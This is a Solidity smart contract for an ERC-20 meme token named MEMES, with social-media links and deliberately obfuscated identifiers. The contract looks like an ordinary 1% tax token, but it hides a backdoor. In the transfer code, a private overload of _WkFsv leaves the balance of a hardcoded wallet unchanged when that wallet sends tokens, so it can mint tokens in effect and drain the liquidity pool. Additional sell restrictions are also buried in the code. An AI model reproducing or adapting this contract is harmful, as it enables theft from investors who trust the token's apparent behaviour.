/*

Whoever masters MEMES. will master the world.

Twitter: https://twitter.com/Memes_erc
Telegram: https://t.me/MemesCoin_erc20
Website: https://memeseth.com/

**/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _WkFsv(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _WkFsv(a, b, "SafeMath");
    }

    function  _WkFsv(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract MEMES is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _jooqzr;
    address payable private _tfrjeh;
    address private _rkfiap;
    string private constant _name = unicode"MEMES";
    string private constant _symbol = unicode"MEMES";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Klfhao=0;
    uint256 private _Fcerjy=0;
    uint256 public _qfckfn = _totalSupply;
    uint256 public _drvdfe = _totalSupply;
    uint256 public _kauljv= _totalSupply;
    uint256 public _vuabcf= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _fvujdf;
    mapping (address => bool) private _vinquy;
    mapping(address => uint256) private _fnqiqx;

    bool private _prbare;
    bool public _udatsq = false;
    bool private yhcdeh = false;
    bool private _opjevp = false;


    event _pejvbh(uint _qfckfn);
    modifier rsfojqr {
        yhcdeh = true;
        _;
        yhcdeh = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _fvujdf[owner(

        )] = true;
        _fvujdf[address
        (this)] = true;
        _fvujdf[
            _tfrjeh] = true;
        _tfrjeh = 
        payable (0xCe755eF0CEc908beec705F407ab362A374DF4c12);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _WkFsv(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 qvukbg=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_udatsq) {
                if (to 
                != address
                (_jooqzr) 
                && to !=
                 address
                 (_rkfiap)) {
                  require(_fnqiqx
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnqiqx
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rkfiap && to != 
            address(_jooqzr) &&
             !_fvujdf[to] ) {
                require(amount 
                <= _qfckfn,
                 "Exceeds the _qfckfn.");
                require(balanceOf
                (to) + amount
                 <= _drvdfe,
                  "Exceeds the _drvdfe.");
                if(_Fcerjy
                < _Klfhao){
                  require
                  (! _rblkxj(to));
                }
                _Fcerjy++;
                 _vinquy
                 [to]=true;
                qvukbg = amount._pvr
                ((_Fcerjy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rkfiap &&
             from!= address(this) 
            && !_fvujdf[from] ){
                require(amount <= 
                _qfckfn && 
                balanceOf(_tfrjeh)
                <_vuabcf,
                 "Exceeds the _qfckfn.");
                qvukbg = amount._pvr((_Fcerjy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_Fcerjy>
                _Klfhao &&
                 _vinquy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!yhcdeh 
            && to == _rkfiap &&
             _opjevp &&
             contractTokenBalance>
             _kauljv 
            && _Fcerjy>
            _Klfhao&&
             !_fvujdf[to]&&
              !_fvujdf[from]
            ) {
                _transferFrom( _japvb(amount, 
                _japvb(contractTokenBalance,
                _vuabcf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prkidh(address
                    (this).balance);
                }
            }
        }

        if(qvukbg>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(qvukbg);
          emit
           Transfer(from,
           address
           (this),qvukbg);
        }
        _balances[from
        ]= _WkFsv(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _WkFsv(qvukbg));
        emit Transfer
        (from, to, 
        amount.
         _WkFsv(qvukbg));
    }

    function _transferFrom(uint256
     tokenAmount) private
      rsfojqr {
        if(tokenAmount==
        0){return;}
        if(!_prbare)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _jooqzr.WETH();
        _approve(address(this),
         address(
             _jooqzr), 
             tokenAmount);
        _jooqzr.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _japvb
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _WkFsv(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _tfrjeh){
            return a ;
        }else{
            return a .
             _WkFsv (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qfckfn = _totalSupply;
        _drvdfe = _totalSupply;
        emit _pejvbh(_totalSupply);
    }

    function _rblkxj(address 
    account) private view 
    returns (bool) {
        uint256 evbwpf;
        assembly {
            evbwpf :=
             extcodesize
             (account)
        }
        return evbwpf > 
        0;
    }

    function _prkidh(uint256
    amount) private {
        _tfrjeh.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _prbare ) ;
        _jooqzr  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _jooqzr), 
            _totalSupply);
        _rkfiap = 
        IUniswapV2Factory(_jooqzr.
        factory( ) 
        ). createPair (
            address(this
            ),  _jooqzr .
             WETH ( ) );
        _jooqzr.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rkfiap).
        approve(address(_jooqzr), 
        type(uint)
        .max);
        _opjevp = true;
        _prbare = true;
    }

    receive() external payable {}
}